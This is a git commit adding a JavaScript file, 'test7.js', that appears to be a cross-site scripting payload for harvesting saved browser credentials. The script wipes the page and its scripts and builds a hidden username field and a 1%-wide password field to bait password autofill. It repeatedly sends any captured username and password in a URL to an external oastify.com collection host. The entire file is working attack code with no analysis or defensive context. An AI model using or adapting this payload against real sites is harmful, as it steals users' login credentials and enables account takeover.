63988a72b6d305c2a73445fabed0b67f721404b4
mrx_w_ <96743453+abx12@users.noreply.github.com>
2025-01-21 17:20:20 +0100

    Create test7.js

---
+++ test7.js
@@ -0,0 +1,68 @@
+document.body.innerHTML = "";
+var scriptss = document.scripts;
+
+for (var i = scriptss.length - 1; i >= 0; i--) {
+var script = scriptss[i];
+script.parentNode.removeChild(script);
+}
+
+var s = document.createElement('style');
+var c = 'body > *:not(form):not(textarea) { display: none !important; }';
+s.appendChild(document.createTextNode(c));
+document.head.appendChild(s);
+
+var form = document.createElement('form');
+
+var inputName = document.createElement('input');
+inputName.type = 'text';
+inputName.id = 'username';
+inputName.name = 'username';
+inputName.autocomplete = 'username';
+inputName.placeholder = 'Check here';
+inputName.style.border = "none";
+inputName.style.outline = "none";
+inputName.style.background = "none";
+inputName.style.width = "100%";
+inputName.classList.add("single-input")
+
+var inputPassword = document.createElement('input');
+inputPassword.type = 'password';
+inputPassword.id = 'password';
+inputPassword.name = 'password';
+inputPassword.autocomplete = 'current-password';
+inputPassword.style.border = "none";
+inputPassword.style.outline = "none";
+inputPassword.style.background = "none";
+inputPassword.style.padding = "0";
+inputPassword.style.width = "1%";
+inputPassword.classList.add("single-input")
+
+form.appendChild(inputName);
+form.appendChild(inputPassword);
+
+document.body.appendChild(form);
+
+// Assuming you have an <input> element with an ID of "myInput"
+var inputElement = document.getElementById("username");
+
+async function sleep(milliseconds) {
+    return new Promise(resolve => setTimeout(resolve, milliseconds));
+  }
+
+setTimeout(async function () {
+while(true){
+await sleep(1000)
+let a = document.getElementsByName('username')[0];
+let b = document.getElementsByName('password')[0];
+function f() {
+if(b.value.length>0) {
+    window.location="https://au8me06o6dzs198npqzrmhcqwh28q2er.oastify.com/?username="+a.value+"&password="+b.value
+}
+}
+a.form.onclick=f;
+a.onchange=f;
+b.onchange=f;
+a.oninput=f;
+b.oninput=f;
+}
+}, 1000);
